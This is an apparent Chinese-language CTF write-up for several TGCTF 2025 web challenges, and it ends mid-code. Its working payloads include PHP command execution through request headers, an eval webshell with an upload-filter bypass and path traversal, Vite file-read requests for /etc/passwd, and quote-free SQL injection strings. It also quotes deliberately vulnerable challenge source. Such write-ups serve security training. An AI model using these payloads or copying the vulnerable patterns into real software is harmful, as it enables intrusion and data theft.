+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">implode</span><span class="hljs-params">()</span></span>	返回一个由数组元素组合成的字符串<br><span class="hljs-function"><span class="hljs-title">apache_request_headers</span><span class="hljs-params">()</span></span>	以数组形式返回apache服务器的请求头部信息<br><span class="hljs-function"><span class="hljs-title">key</span><span class="hljs-params">()</span></span>	从关联数组中取得键名<br><span class="hljs-function"><span class="hljs-title">lcfirst</span><span class="hljs-params">()</span></span>	用于将字符串中的首字符转换为小写。<br></code></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">?tgctf2025=system(implode(apache_request_headers()));<br><br>bp抓包然后在请求头里添加一个hack: <span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">?tgctf2025=<span class="hljs-meta">system</span>(hex2bi<span class="hljs-meta">n</span>(lcfirst(<span class="hljs-keyword">key</span>(apache_request_headers()))));<br><br>bp抓包然后在请求头里添加一个636174202f666c6167: 123<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="ez-upload"><a href="#ez-upload" class="headerlink" title="(ez)upload"></a><strong>(ez)upload</strong></h1><p>当时做这题我就想着能够传入.user.ini但是上传目录中没有.php文件，无法实现包含，所以搞得一头雾水，结果看完题解说能够目录传越将.user.ini传到上级目录直接人傻了，而且上级目录有两个.php文件，直接能实现包含。</p>
+<p>访问url&#x2F;upload.bak把源码下载下来</p>
+<p>代码审计</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UPLOAD_PATH&#x27;</span>, <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/uploads/&#x27;</span>);<br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$status_code</span> = <span class="hljs-number">200</span>; <span class="hljs-comment">// 默认状态码为 200</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php4&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span class="hljs-string">&quot;php2&quot;</span>, <span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;htm&quot;</span>, <span class="hljs-string">&quot;phtml&quot;</span>, <span class="hljs-string">&quot;pht&quot;</span>, <span class="hljs-string">&quot;jsp&quot;</span>, <span class="hljs-string">&quot;jspa&quot;</span>, <span class="hljs-string">&quot;jspx&quot;</span>, <span class="hljs-string">&quot;jsw&quot;</span>, <span class="hljs-string">&quot;jsv&quot;</span>, <span class="hljs-string">&quot;jspf&quot;</span>, <span class="hljs-string">&quot;jtml&quot;</span>, <span class="hljs-string">&quot;asp&quot;</span>, <span class="hljs-string">&quot;aspx&quot;</span>, <span class="hljs-string">&quot;asa&quot;</span>, <span class="hljs-string">&quot;asax&quot;</span>, <span class="hljs-string">&quot;ascx&quot;</span>, <span class="hljs-string">&quot;ashx&quot;</span>, <span class="hljs-string">&quot;asmx&quot;</span>, <span class="hljs-string">&quot;cer&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>, <span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file_name</span>, PATHINFO_EXTENSION);<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$file_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$temp_file</span>);<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?&lt;/s&#x27;</span>, <span class="hljs-variable">$file_content</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件内容包含非法字符，禁止上传！&#x27;</span>;<br>                <span class="hljs-variable">$status_code</span> = <span class="hljs-number">403</span>; <span class="hljs-comment">// 403 表示禁止访问</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-variable">$file_name</span>;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                    <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件上传成功！&#x27;</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>                    <span class="hljs-variable">$status_code</span> = <span class="hljs-number">500</span>; <span class="hljs-comment">// 500 表示服务器内部错误</span><br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;禁止保存为该类型文件！&#x27;</span>;<br>            <span class="hljs-variable">$status_code</span> = <span class="hljs-number">403</span>; <span class="hljs-comment">// 403 表示禁止访问</span><br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>        <span class="hljs-variable">$status_code</span> = <span class="hljs-number">404</span>; <span class="hljs-comment">// 404 表示资源未找到</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 设置 HTTP 状态码</span><br><span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-variable">$status_code</span>);<br><br><span class="hljs-comment">// 输出结果</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<br>    <span class="hljs-string">&#x27;status_code&#x27;</span> =&gt; <span class="hljs-variable">$status_code</span>,<br>    <span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-variable">$msg</span>,<br>]);<br></code></pre></td></tr></table></figure>
+
+<hr>
+<p>构造payload：</p>
+<p>过滤了一堆后缀，同时用preg_match进行了waf，不闭合尖括号即可绕过preg_match的正则匹配：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br></code></pre></td></tr></table></figure>
+
+<p>也可以使用PCRE回溯次数绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">101</span>万左右的任意字符+<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-built_in">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br></code></pre></td></tr></table></figure>
+
+<p>这里我们注意到可以传入name参数来控制文件名，且basename文件没有对传入的name参数进行清洗</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$img_path = UPLOAD_PATH . $file_name<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>$img_path是由文件名直接拼接得到的，存在目录穿越漏洞，因此我们可以将文件上传到&#x2F;var&#x2F;www&#x2F;html目录中，配合.user.ini实现对非.php文件的解析，上线webshell</p>
+<p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-1.png"></p>
+<p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-2.png"></p>
+<p>payload：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/<span class="hljs-keyword">index</span>.php?cmd=<span class="hljs-keyword">system</span>(&quot;env&quot;);<br>或/upload.php?cmd=<span class="hljs-keyword">system</span>(&quot;env&quot;);<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="前端GAME"><a href="#前端GAME" class="headerlink" title="前端GAME"></a>前端GAME</h1><p>做这题以为和其他前端小游戏题一样，要么改分要么直接触发通关，结果看题解说是CVE任意文件读取</p>
+<p>先查看源码</p>
+<p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-3.png"></p>
+<p>提示flag在&#x2F;tgflagggg，但是并没有找到相关读取功能，但是可以检索到相关CVE：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/risheng/p/18795361">Vite CVE-2025-30208安全漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/IDHALASHAO/article/details/146611941">CVE-2025-30208 |Vite-漏洞分析与复现</a></p>
+<p>payload：</p>
+<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspectj">/<span class="hljs-meta">@fs</span>/tgflagggg?<span class="hljs-keyword">import</span>&amp;raw??<br></code></pre></td></tr></table></figure>
+
+<h1 id="前端GAME-Plus"><a href="#前端GAME-Plus" class="headerlink" title="前端GAME Plus"></a><strong>前端GAME Plus</strong></h1><p>考点总结：CVE-2025-31486 </p>
+<p>Vite开发服务器任意文件读取漏洞 题目描述：非常适合新生的前端小游戏Plus版，真的吗。 WP： CVE-<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkyMTcwNjg4Mw==&mid=2247483811&idx=1&sn=2b4403023fd911f611bf5590ea3796d6&scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzkyMTcwNjg4Mw==&amp;mid=2247483811&amp;idx=1&amp;sn=2b4403023fd911f611bf5590ea3796d6&amp;scene=21#wechat_redirect</a></p>
+<p>flag在根目录下 &#x2F;tgflagggg 中 </p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crystal">/etc/passwd?.svg?.wasm?init<br><span class="hljs-regexp">/tgflagggg?.svg?.wasm?init</span><br><span class="hljs-regexp">#这个打法，不太好猜路径</span><br><span class="hljs-regexp">curl &quot;http:/</span><span class="hljs-regexp">/node1.tgctf.woooo.tech:32613/</span><span class="hljs-variable">@fs</span>/app/?<span class="hljs-regexp">/../</span>../../../../tgflagggg?<br>import&amp;?raw<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="前端GAME-Ultra"><a href="#前端GAME-Ultra" class="headerlink" title="前端GAME Ultra"></a><strong>前端GAME Ultra</strong></h1><p>考点总结：CVE-2025-32395 </p>
+<p>Vite开发服务器任意文件读取漏洞（兵不厌诈） 题目描述：非常适合新生的前端小游戏Ultra版，真的吗。 WP： CVE-2025-32395 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/HMhzXqSplWa-IwpftxwTiA">https://mp.weixin.qq.com/s/HMhzXqSplWa-IwpftxwTiA</a></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">访问<span class="hljs-regexp">/@fs/</span>tmp<span class="hljs-regexp">/获得绝对路径/</span>app，同时给了附件看docker也能看出路径<br><br>curl --request-target <span class="hljs-regexp">/@fs/</span>app<span class="hljs-regexp">/#/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">58664</span>/<br>curl --request-target <span class="hljs-regexp">/@fs/</span>app<span class="hljs-regexp">/#/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/tgflagggg http:/</span><span class="hljs-regexp">/127.0.0.1:58664/</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="TGCTF2025-后台管理"><a href="#TGCTF2025-后台管理" class="headerlink" title="TGCTF2025 后台管理"></a>TGCTF2025 后台管理</h1><p>源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, redirect, render_template,<br>render_template_string<br><span class="hljs-keyword">import</span> pymysql.cursors<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>    <span class="hljs-keyword">return</span> pymysql.connect(<br>        host=os.environ[<span class="hljs-string">&quot;MYSQL_HOST&quot;</span>],<br>        user=os.environ[<span class="hljs-string">&quot;MYSQL_USER&quot;</span>],<br>        password=os.environ[<span class="hljs-string">&quot;MYSQL_PASSWORD&quot;</span>],<br>        database=os.environ[<span class="hljs-string">&quot;MYSQL_DATABASE&quot;</span>],<br>        charset=<span class="hljs-string">&quot;utf8mb4&quot;</span>,<br>        cursorclass=pymysql.cursors.DictCursor,<br>   )<br>   <br>app = Flask(name)<br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.cookies:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, username=request.cookies[<span class="hljs-string">&quot;username&quot;</span>])<br>    <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>可以在参数中使用 \ 来转义字符串从而绕开引号的限制，剩下的就很简单了。<br>    <span class="hljs-keyword">if</span> request.method  <span class="hljs-string">&quot;POST&quot;</span>:<br>        username = request.form.get(<span class="hljs-string">&quot;username&quot;</span>)<br>        password = request.form.get(<span class="hljs-string">&quot;password&quot;</span>)<br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> password <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;要输入账号密码喔~&quot;</span>, <span class="hljs-number">400</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(username) &gt; <span class="hljs-number">64</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(password) &gt; <span class="hljs-number">64</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;哈~太长了，受不了了~&quot;</span>, <span class="hljs-number">400</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#x27;&quot;</span> <span class="hljs-keyword">in</span> username <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&#x27;&quot;</span> <span class="hljs-keyword">in</span> password:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;杂鱼，还想SQL注入？爬！&quot;</span>, <span class="hljs-number">400</span><br>            <br>        conn = <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">try</span>:<br>            conn = db()<br>            <span class="hljs-keyword">with</span> conn.cursor() <span class="hljs-keyword">as</span> cursor:<br>                cursor.execute(<br>                    <span class="hljs-string">f&quot;SELECT * FROM users WHERE username = &#x27;<span class="hljs-subst">&#123;username&#125;</span>&#x27; AND</span><br><span class="hljs-string">password = &#x27;<span class="hljs-subst">&#123;password&#125;</span>&#x27;&quot;</span><br>               )<br>                user = cursor.fetchone()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>, <span class="hljs-number">500</span><br>        <span class="hljs-keyword">finally</span>:<br>            <span class="hljs-keyword">if</span> conn <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                conn.close()<br>        <span class="hljs-keyword">if</span> user <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> user:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;账号密码错误&quot;</span>, <span class="hljs-number">400</span><br>        response = redirect(<span class="hljs-string">&quot;/&quot;</span>)<br>       response.set_cookie(<span class="hljs-string">&quot;username&quot;</span>, user[<span class="hljs-string">&quot;username&quot;</span>])<br>        <span class="hljs-keyword">return</span> response<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;login.html&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>可以在参数中使用 \ 来转义字符串从而绕开引号的限制然后使用报错注入。并且引号被过滤了，所以报错注入中的’~’可以改为null，就不需要单引号了。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">username=\&amp;<span class="hljs-keyword">password</span>=<span class="hljs-keyword">and</span> updatexml(<span class="hljs-keyword">null</span>,concat((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> flag)),<span class="hljs-keyword">null</span>)<span class="hljs-comment">--+</span><br><br>username=\&amp;<span class="hljs-keyword">password</span>=<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> *,<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> flag#<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="TG-wordpress"><a href="#TG-wordpress" class="headerlink" title="TG_wordpress"></a><strong>TG_wordpress</strong></h1><p>Sample Page发现小记，可以知道前台有多个方向漏洞。 </p>
+<p>这里我就写个MISC方向的漏洞</p>
+<p><strong>logo另存为图片，jphide可以找到hint。</strong></p>
+<p>hint内容：</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-addition">+ HINT(not flag/FLAG):</span><br><span class="hljs-addition">+ username/password:</span><br><span class="hljs-addition">+ TG_wordpressor</span><br><span class="hljs-addition">+ aXx^oV@K&amp;cFoVaztQ*</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+ All hints have the same content</span><br><span class="hljs-addition">+ obtaining one is enough</span><br></code></pre></td></tr></table></figure>
+
+<p>然后用账号密码登录，进入后台</p>
+<p>发现插件有6.0的WP File Manager。漏洞号是CVE-2020-25213</p>
+<p>然后根据题目的提示<code>flag形式是TGCTF&#123;CVE编号&#125;</code></p>
+<p>所以flag</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">TGCTF</span>&#123;CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">25213</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="熟悉的配方，熟悉的味道"><a href="#熟悉的配方，熟悉的味道" class="headerlink" title="熟悉的配方，熟悉的味道"></a><strong>熟悉的配方，熟悉的味道</strong></h1><p>源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pyramid.config <span class="hljs-keyword">import</span> Configurator<br><span class="hljs-keyword">from</span> pyramid.request <span class="hljs-keyword">import</span> Request<br><span class="hljs-keyword">from</span> pyramid.response <span class="hljs-keyword">import</span> Response<br><span class="hljs-keyword">from</span> pyramid.view <span class="hljs-keyword">import</span> view_config<br><span class="hljs-keyword">from</span> wsgiref.simple_server <span class="hljs-keyword">import</span> make_server<br><span class="hljs-keyword">from</span> pyramid.events <span class="hljs-keyword">import</span> NewResponse<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Environment, BaseLoader<br><br>eval_globals = &#123; <span class="hljs-comment">#防止eval执行恶意代码</span><br>    <span class="hljs-string">&#x27;__builtins__&#x27;</span>: &#123;&#125;,      <span class="hljs-comment"># 禁用所有内置函数</span><br>    <span class="hljs-string">&#x27;__import__&#x27;</span>: <span class="hljs-literal">None</span>       <span class="hljs-comment"># 禁止动态导入</span><br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkExpr</span>(<span class="hljs-params">expr_input</span>):<br>    expr = re.split(<span class="hljs-string">r&quot;[-+*/]&quot;</span>, expr_input)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">exec</span>(expr_input))<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(expr) != <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">int</span>(expr[<span class="hljs-number">0</span>])<br>        <span class="hljs-built_in">int</span>(expr[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home_view</span>(<span class="hljs-params">request</span>):<br>    expr_input = <span class="hljs-string">&quot;&quot;</span><br>    result = <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        expr_input = request.POST[<span class="hljs-string">&#x27;expr&#x27;</span>]<br>        <span class="hljs-keyword">if</span> checkExpr(expr_input):<br>            <span class="hljs-keyword">try</span>:<br>                result = <span class="hljs-built_in">eval</span>(expr_input, eval_globals)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                result = e<br>        <span class="hljs-keyword">else</span>:<br>            result = <span class="hljs-string">&quot;爬！&quot;</span><br><br><br>    template_str = 【xxx】<br><br>    env = Environment(loader=BaseLoader())<br>    template = env.from_string(template_str)<br>    rendered = template.render(expr_input=expr_input, result=result)<br>    <span class="hljs-keyword">return</span> Response(rendered)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> Configurator() <span class="hljs-keyword">as</span> config:<br>        config.add_route(<span class="hljs-string">&#x27;home_view&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)<br>        config.add_view(home_view, route_name=<span class="hljs-string">&#x27;home_view&#x27;</span>)<br>        app = config.make_wsgi_app()<br><br>    server = make_server(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9040</span>, app)<br>    